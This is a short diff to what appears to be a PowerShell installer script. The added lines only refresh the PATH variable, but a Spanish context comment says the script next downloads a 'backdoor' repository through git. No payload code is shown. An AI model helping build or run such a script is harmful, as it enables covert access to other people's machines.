@@ -95,6 +95,10 @@ function refresh_path {
 	Wait-Job $job
 	Receive-Job $job
 	"FN: Path actualizado"
+
+	$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") +
+		";" +
+		[System.Environment]::GetEnvironmentVariable("Path","User")
 }
 
 # Si tiene git instalado y puede encontrarlo descarga el repositorio del backdoor
